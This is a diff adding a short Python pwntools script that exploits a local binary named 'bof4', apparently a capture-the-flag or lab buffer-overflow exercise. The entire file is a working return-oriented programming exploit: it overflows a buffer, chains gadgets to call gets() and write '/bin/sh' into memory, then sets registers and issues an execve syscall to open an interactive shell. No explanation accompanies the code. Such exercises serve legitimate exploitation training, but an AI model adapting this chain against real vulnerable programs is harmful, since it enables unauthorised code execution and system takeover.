@@ -1,0 +1,23 @@
+#!/usr/bin/python3
+
+from pwn import *
+
+p = process("./bof4")
+e = ELF("./bof4")
+
+gets = e.symbols['gets']
+pop_rdi = 0x000000000040220e
+pop_rsi = 0x00000000004015ae
+pop_rdx = 0x00000000004043e4
+pop_rax = 0x0000000000401001
+syscall = 0x000000000040132e
+binsh_addr = 0x406e00
+
+payload = b'A' * 0x50 + b'B' * 0x8 + p64(pop_rdi) + p64(binsh_addr) + p64(gets) # read "/bin/sh"
+payload += p64(pop_rdi) + p64(binsh_addr) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0)
+payload += b'A' * 0x28
+payload += p64(pop_rax) + p64(0x3b) + p64(syscall) #execve("/bin/sh", 0, 0)
+
+p.sendlineafter("Say something: ", payload)
+p.sendline(b"/bin/sh")
+p.interactive()
